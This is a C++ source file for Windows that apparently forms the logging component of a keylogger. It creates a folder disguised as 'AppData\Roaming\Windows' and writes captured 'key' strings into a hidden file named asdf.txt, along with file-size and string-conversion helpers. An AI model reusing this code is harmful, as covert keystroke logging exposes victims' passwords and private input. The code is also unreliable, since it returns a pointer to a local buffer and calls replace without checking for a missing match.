#define _CRT_SECURE_NO_WARNINGS
#define ULEN 200
#include "stdafx.h"
#include "filemanager.h"

using namespace std;

time_t t = time(NULL);
struct tm tm = *localtime(&t);
TCHAR username[ULEN] = { 0, };
DWORD usersize = sizeof(username) / sizeof(username[0]);

char* getlogfilename() {
	char time[50] = { 0, };
	sprintf(time, "%d", tm.tm_year);
	char month[10] = { 0, };
	sprintf(month, "%d", tm.tm_mon);
	char day[10] = { 0, };
	sprintf(day, "%d", tm.tm_mday);
	strcat(time, month); 
	strcat(time, day); 
	strcat(time, ".log");
	return time;
}

char* getlogfilepath(const char* filename) {
	GetUserName(LPWSTR(username), &usersize);
	char dirpath[100] = "C:\\Users\\";
	char filepath[100] = "C:\\Users\\";
	static char filename2[100] = { 0, };
	// sprintf(filename2, "%s", filename);
	// PathAppend(LPWSTR(dirpath), LPWSTR(username));
	// PathAppend(LPWSTR(dirpath), L"Appdata\\Roaming\\Windows");
	strcat(dirpath, ConvertWCtoC(username));
	strcat(dirpath, "\\Appdata\\Roaming\\Windows");
	if (PathFileExists(LPWSTR(dirpath))==NULL) {
		_mkdir(dirpath);
	}
	// PathAppend(LPWSTR(filepath), LPWSTR(username));
	// PathAppend(LPWSTR(filepath), L"Appdata\\Roaming\\Windows");
	// PathAppend(LPWSTR(filepath), LPCWSTR(filename));
	strcat(filepath, ConvertWCtoC(username));
	strcat(filepath, "\\Appdata\\Roaming\\Windows");
	strcat(filepath, filename);
	strcpy(filename2,filepath);
	return filename2;
}

void logger(string key) {
	key = key.replace(key.find("'"), 1, "");
	fstream f;
	char ch_key[100] = { 0, };
	strcpy(ch_key, key.c_str());
	f.open(getlogfilepath("\\asdf.txt"));
	f.write(ch_key, sizeof(ch_key));
	f.close();
}

int getfilesize() {
	int rst = 0;
	char path[100] = { 0, };
	strcpy(path, string(getlogfilepath("\\asdf.txt")).c_str());
	FILE* f = NULL;
	if (path == NULL) {
		return rst;
	}
	fopen_s(&f, path, "r");
	if (f != NULL) {
		fseek(f, 0, SEEK_END);
		rst = ftell(f);
		fclose(f);
	}
	return rst;
}

//wchar_t 에서 char 로의 형변환 함수
char* ConvertWCtoC(wchar_t* str)
{
	//반환할 char* 변수 선언
	char* pStr;

	//입력받은 wchar_t 변수의 길이를 구함
	int strSize = WideCharToMultiByte(CP_ACP, 0, str, -1, NULL, 0, NULL, NULL);

	//char* 메모리 할당
	pStr = new char[strSize];

	//형 변환
	WideCharToMultiByte(CP_ACP, 0, str, -1, pStr, strSize, 0, 0);

	return pStr;
}

///////////////////////////////////////////////////////////////////////
//char 에서 wchar_t 로의 형변환 함수
wchar_t* ConverCtoWC(char* str)
{
	//wchar_t형 변수 선언
	wchar_t* pStr;
	//멀티 바이트 크기 계산 길이 반환
	int strSize = MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, NULL);

	//wchar_t 메모리 할당
	pStr = new WCHAR[strSize];
	//형 변환
	MultiByteToWideChar(CP_ACP, 0, str, strlen(str) + 1, pStr, strSize);

	return pStr;
}